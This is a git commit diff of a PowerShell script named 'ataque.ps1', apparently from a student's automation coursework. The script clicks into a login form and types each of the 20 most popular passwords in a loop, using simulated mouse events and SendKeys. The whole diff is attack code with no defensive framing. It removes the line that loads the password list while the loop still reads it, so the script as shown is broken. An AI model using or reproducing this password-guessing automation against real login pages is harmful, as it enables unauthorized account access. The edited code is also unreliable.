ba4ee7bd03191f79700fc4cae381ffee19fa9ac3
Jesús <jsus3005@gmail.com>
2023-12-19 09:56:19 +0100

    update

--- Entornos de Desarrollo/Automatización/ataque.ps1
+++ Entornos de Desarrollo/Automatización/ataque.ps1
@@ -7,26 +7,19 @@ public static extern void mouse_event(long dwFlags, long dx, long dy, long cButt
 $MouseEvent = Add-Type -memberDefinition $MouseEventSig -name "MouseEventWinApi" -passThru
 
  
- Clear-Content -Path "C:\Users\magol\1. DAM\Entornos de Desarrollo\Automatización\Contraseñas.txt"
- $palabras = Get-Content "C:\Users\magol\1. DAM\Entornos de Desarrollo\Automatización\ContraseñasPopulares.txt" -Raw -PipelineVariable linea | ForEach-Object { $_ -split ',' }
 
- #Ampliar la pantalla
-[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(1116,280)
-$MouseEvent::mouse_event(0x00000002, 0, 0, 0, 0)
-$MouseEvent::mouse_event(0x00000004, 0, 0, 0, 0)
 
 $contador = 0
 
 $contador = 0
 
 #Intentar iniciar sesión con las 20 contraseñas más populares 
-
 while ($contador -lt 20) {
     
     $contraseña = $palabras[$contador]
 
     #Clica en el usuario e inserta el correo deseado
-    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(119, 214)
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(909, 228)
     $MouseEvent::mouse_event(0x00000002, 0, 0, 0, 0)
     $MouseEvent::mouse_event(0x00000004, 0, 0, 0, 0)
 
@@ -35,15 +28,16 @@ while ($contador -lt 20) {
     
     #Clica en la contraseña y la saca de un archivo txt en el que
     #previamente se han insertado las contraseñas a probar
-    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(126, 279)
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(925, 278)
     $MouseEvent::mouse_event(0x00000002, 0, 0, 0, 0)
     $MouseEvent::mouse_event(0x00000004, 0, 0, 0, 0)
 
     [System.Windows.Forms.SendKeys]::SendWait($contraseña)
 
-    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(133, 314)
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(926, 309)
     $MouseEvent::mouse_event(0x00000002, 0, 0, 0, 0)
     $MouseEvent::mouse_event(0x00000004, 0, 0, 0, 0)
 
     $contador++
 }
+
